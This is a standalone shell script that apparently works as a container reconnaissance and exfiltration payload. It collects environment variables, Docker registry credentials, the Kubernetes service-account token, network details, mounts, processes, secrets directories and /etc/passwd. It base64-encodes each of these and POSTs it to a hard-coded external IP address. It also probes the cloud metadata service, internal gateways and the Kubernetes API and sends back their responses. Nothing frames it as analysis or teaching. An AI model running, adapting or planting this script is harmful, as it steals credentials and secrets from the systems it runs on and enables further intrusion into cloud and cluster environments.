#!/bin/sh
VPS="5.39.252.153"
P() { curl -s -X POST --connect-timeout 5 --max-time 8 --data-binary "$2" "http://$VPS/$1" 2>/dev/null; }
P "F019-ENV" "$(env 2>/dev/null | base64 | tr -d '\n')"
P "F019-DOCKER-CFG" "$(cat /root/.docker/config.json 2>/dev/null | base64 | tr -d '\n')"
P "F019-K8S-SA" "$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | base64 | tr -d '\n')"
P "F019-SOCK" "$(ls -la /var/run/docker.sock /run/docker.sock 2>&1 | base64 | tr -d '\n')"
P "F019-CAPS" "$(cat /proc/self/status 2>/dev/null | grep -E 'Cap|Seccomp' | base64 | tr -d '\n')"
P "F019-NET" "$(( ip addr 2>/dev/null; ip route 2>/dev/null; cat /etc/hosts; cat /etc/resolv.conf ) | base64 | tr -d '\n')"
for TARGET in "192.168.4.72:8000" "169.254.169.254" "10.0.0.1" "10.96.0.1" "172.17.0.1"; do
  RESULT=$(curl -sk --connect-timeout 2 --max-time 3 "http://$TARGET/" 2>&1 | head -c 500)
  [ -n "$RESULT" ] && P "F019-REACH-$(echo $TARGET | tr ':/' '-')" "$(echo "$RESULT" | base64 | tr -d '\n')"
done
RESULT=$(curl -sk --connect-timeout 2 --max-time 3 "https://kubernetes.default.svc/" 2>&1 | head -c 500)
P "F019-K8S-API" "$(echo "$RESULT" | base64 | tr -d '\n')"
P "F019-MOUNTS" "$(cat /proc/mounts 2>/dev/null | base64 | tr -d '\n')"
P "F019-PROCS" "$(ps aux 2>/dev/null | head -c 2000 | base64 | tr -d '\n')"
P "F019-FS" "$(ls -la /run/secrets/ /tmp/ /root/ 2>&1 | head -c 1000 | base64 | tr -d '\n')"
P "F019-NS" "$(ls -la /proc/1/ns/ 2>/dev/null | base64 | tr -d '\n')"
P "F019-PASSWD" "$(cat /etc/passwd 2>/dev/null | base64 | tr -d '\n')"
